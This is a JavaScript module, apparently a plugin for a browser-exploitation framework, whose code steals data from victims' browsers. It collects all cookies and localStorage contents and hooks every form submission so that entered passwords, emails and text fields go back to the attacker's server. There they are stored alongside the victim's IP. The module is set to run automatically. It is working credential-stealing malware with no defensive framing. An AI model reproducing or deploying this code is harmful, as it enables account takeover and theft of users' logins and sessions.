const nosql = require("nosql");

const path = require("path");
const util = require("util");

const cookieDb = nosql.load(path.join(__dirname, "..", "cookieDb.nosql"));;
const credDb = nosql.load(path.join(__dirname, "..", "credDb.nosql"));;

module.exports = (M) => {

	M.setDefaultConfig({
	});

	M.setMainFunction((module, socket, config) => {
		socket.on("creds", (password, email, text, url, host) => {
			credDb.insert({password, email, text, url, host, client: socket.ip}, true);
		});

		M.executeRemoteFuncFromThisModule(socket, "stealCookies", "", (out) => {
			let cookies = {};
			out[0].split("; ").forEach((cookie) => {
				if (cookie != "") {
					let ck = cookie.split("=");
					cookies[ck[0]] = ck[1];
				}
			});
			cookieDb.insert({cookies, localStorage: out[1], host: out[2], client: socket.ip}, true);
		});

		M.executeRemoteFuncFromThisModule(socket, "hookForm", "");
	})

	M.addRemoteFunction("stealCookies", function (args, debug) {
		let keys = Object.keys(localStorage);
		let values = Object.values(localStorage);

		let lS = {};

		keys.forEach((key, i) => {
			lS[key] = values[i];
		})

		return [document.cookie, lS, document.location.host];
	});

	M.addRemoteFunction("hookForm", function (args, debug) {
		let forms = document.getElementsByTagName("form");

		let c = (form) => {
			let password;
			let text = [];
			let email;

			let inputs = form.getElementsByTagName("input");

			for (let i = 0; i < inputs.length; i++) {
				const e = inputs.item(i);
				if (e.type === "text") {
					text.push(e.value);
				} else if (e.type === "password") {
					password = e.value;
				} else if (e.type === "email") {
					email = e.value;
				}
			}

			socket.emit("creds", password, email, text, document.location.href, document.location.host);
		};

		for (let i = 0; i < forms.length; i++) {
			const form = forms.item(i);

			form.onsubmit = c.bind(window, form);
		}
	});

	M.setAutoRunStatus(true);
	M.setPlatform("js/browser");

	return M;
}